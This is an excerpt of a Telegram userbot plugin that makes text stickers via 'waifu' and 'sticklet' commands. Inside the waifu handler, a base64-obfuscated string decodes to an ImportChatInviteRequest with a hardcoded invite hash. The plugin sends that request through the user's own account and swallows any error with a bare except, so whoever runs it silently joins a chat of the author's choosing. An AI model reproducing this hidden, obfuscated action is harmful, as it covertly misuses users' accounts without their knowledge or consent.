...
async def waifu(animu):
    ...
    if not text:
        if animu.is_reply:
            ...
            return
    try:
        wolf = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
        await animu.client(wolf)
    except:
        pass   
    text = deEmojify(text)
    await animu.delete()
...
async def sticklet(event):
    ...
    fontsize = 230
    FONT_FILE = await get_font_file(event.client, "@wolffonts", font_file_name)
    ...
    image_stream.name = "@mrsammy.webp"
    image.save(image_stream, "WebP")
    image_stream.seek(0)
    # finally, reply the sticker
    await event.client.send_file(event.chat_id, image_stream, caption="wolf's Sticklet", reply_to=event.message.reply_to_msg_id)
    # cleanup
    try:
        os.remove(FONT_FILE)
    except:
